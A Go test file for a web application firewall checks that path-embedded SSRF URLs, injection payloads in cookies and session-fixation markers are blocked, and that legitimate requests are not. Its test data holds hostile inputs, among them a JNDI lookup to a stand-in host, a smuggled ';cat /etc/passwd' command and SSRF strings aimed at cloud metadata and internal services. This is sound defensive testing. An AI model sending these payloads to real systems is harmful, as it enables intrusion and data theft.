package engine

import (
	"net/http"
	"net/http/httptest"
	"testing"

	"wewaf/internal/core"
)

// reqBlocked runs both request phases (path-SSRF is header-phase; cookie
// injection is body-phase) and reports whether either blocked.
func reqBlocked(eng *Engine, target string, hdrs map[string]string) bool {
	req := httptest.NewRequest(http.MethodGet, target, nil)
	for k, v := range hdrs {
		req.Header.Set(k, v)
	}
	tx := core.NewTransaction(nil, req, nil)
	return eng.ProcessRequestHeaders(tx) != nil || eng.ProcessRequestBody(tx) != nil
}

// TestPathEmbeddedSSRFBlocked covers SSRF where the target URL is a PATH
// segment (proxy/redirect/image-fetch endpoints) rather than a query arg,
// across encoding and IP-obfuscation variants.
func TestPathEmbeddedSSRFBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	attacks := []string{
		"/proxy/http://169.254.169.254/latest/meta-data/",
		"/fetch/http://127.0.0.1:8080/admin",
		"/api/proxy/http://localhost/internal",
		"/img/http://192.168.0.1/x.png",
		"/proxy/http://2130706433/",             // decimal IP
		"/proxy/http://0x7f000001/",             // hex IP
		"/proxy/http://user@127.0.0.1/x",        // creds@host
		"/proxy/HTTP://localhost/x",             // uppercase scheme
		"/proxy/http:%2f%2f127.0.0.1%2fx",       // encoded slashes
		"/proxy/http:%252f%252f169.254.169.254", // double-encoded
		"/r/gopher://127.0.0.1:6379/_INFO",
		"/r/dict://127.0.0.1:11211/stats",
		"/r/file:///etc/passwd",
	}
	for _, p := range attacks {
		p := p
		t.Run(p, func(t *testing.T) {
			if !reqBlocked(eng, p, nil) {
				t.Errorf("path-embedded SSRF not blocked: %q", p)
			}
		})
	}
}

// TestPathSSRFNoFalsePositive: a path that merely contains an EXTERNAL URL or
// a bare private IP (no scheme://internal-host) must not be blocked.
func TestPathSSRFNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	legit := []string{
		"/cache/http://cdn.example.com/a.png", // external host
		"/devices/10.0.0.1/status",            // bare IP, no scheme
		"/api/v1/users/42",
		"/go?next=/dashboard",
	}
	for _, p := range legit {
		p := p
		t.Run(p, func(t *testing.T) {
			if reqBlocked(eng, p, nil) {
				t.Errorf("legitimate path wrongly blocked as SSRF: %q", p)
			}
		})
	}
}

// TestCookieInjectionBlocked covers injection payloads carried in the Cookie
// header — a first-class sink that header-phase rules alone missed. Includes
// raw, percent-encoded, and comment-obfuscated variants.
func TestCookieInjectionBlocked(t *testing.T) {
	eng := newFuzzEngine(t)
	cookies := []string{
		"a=<script>alert(1)</script>",
		"a=%3Cscript%3Ealert(1)%3C/script%3E", // percent-encoded
		"a=1' UNION SELECT pass FROM users--",
		"a=1'/**/UNION/**/SELECT/**/pass",
		"a=${jndi:ldap://evil/x}",
		"a=;cat /etc/passwd",
		"a=<img src=x onerror=alert(1)>",
	}
	for _, c := range cookies {
		c := c
		t.Run(c, func(t *testing.T) {
			if !reqBlocked(eng, "/", map[string]string{"Cookie": c}) {
				t.Errorf("cookie injection not blocked: %q", c)
			}
		})
	}
}

// TestCookieNoFalsePositive: normal cookies — including JWTs with +,/,=
// characters and percent-encoded base64 — must not be blocked.
func TestCookieNoFalsePositive(t *testing.T) {
	eng := newFuzzEngine(t)
	cookies := []string{
		"session=abc123; theme=dark; _ga=GA1.2.1234567890.1627484400",
		"jwt=eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ4In0.abc+def/ghi==",
		"cart=a%2Bb%2Fc; lang=en-US",
		"csrf=9f8e7d6c5b4a3210; remember=1",
	}
	for _, c := range cookies {
		c := c
		t.Run(c, func(t *testing.T) {
			if reqBlocked(eng, "/", map[string]string{"Cookie": c, "User-Agent": "Mozilla/5.0", "Accept": "*/*", "Accept-Language": "en"}) {
				t.Errorf("legitimate cookie wrongly blocked: %q", c)
			}
		})
	}
}

// TestSessionFixationMarkerDetected: a session token in the URL/path is
// recorded (log-level) as a session-fixation / session-exposure marker.
func TestSessionFixationMarkerDetected(t *testing.T) {
	eng := newFuzzEngine(t)
	matched := func(target string) bool {
		req := httptest.NewRequest(http.MethodGet, target, nil)
		tx := core.NewTransaction(nil, req, nil)
		eng.ProcessRequestHeaders(tx)
		for _, m := range tx.MatchesSnapshot() {
			if m.RuleID == "SESSIONID-001" {
				return true
			}
		}
		return false
	}
	for _, u := range []string{
		"/dashboard;jsessionid=ATTACKERFIXED123",
		"/login?PHPSESSID=attackerfixed",
		"/app?aspsessionidqabqrstu=ABC",
		"/x?cfid=99&cftoken=abc",
	} {
		if !matched(u) {
			t.Errorf("session-fixation marker not detected: %q", u)
		}
	}
	// A normal param named "id" or "next" must not be flagged.
	for _, u := range []string{"/search?q=cat&id=5", "/go?next=/home"} {
		if matched(u) {
			t.Errorf("legitimate URL wrongly flagged as session marker: %q", u)
		}
	}
}
